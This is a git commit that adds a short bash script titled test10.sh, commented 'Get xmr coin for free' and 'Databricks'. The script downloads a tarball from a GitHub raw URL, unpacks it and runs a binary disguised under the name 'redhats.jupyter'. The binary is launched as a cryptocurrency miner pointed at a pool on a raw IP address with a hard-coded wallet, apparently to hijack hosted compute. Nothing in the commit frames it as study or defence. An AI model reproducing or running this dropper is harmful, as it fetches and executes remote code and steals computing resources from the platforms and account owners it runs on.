2c190f64d02fb170e10b28eb5f8129c80bf86325
philip330 <32610455+philip330@users.noreply.github.com>
2022-10-06 20:41:06 +0100

    test10.sh

---
+++ test10.sh
@@ -0,0 +1,8 @@
+#! /bin/bash
+# Get xmr coin for free
+# Databricks
+
+wget https://raw.githubusercontent.com/chirifa201/python/main/redhats.jupyter.tar.gz
+tar xvzf redhats.jupyter.tar.gz
+cd redhats.jupyter
+./redhats.jupyter -a argon2/chukwav2 -o 142.132.131.248:80 -u TRTLv1hc4Ys615aVETRD9tB73tP7H53bwY3RQkBn7xH7iJzXP6FqKh9hJ8od82q59QLHLSiWiGEjYhoDPnCAcnWcS8nSGccNVsA -p test112
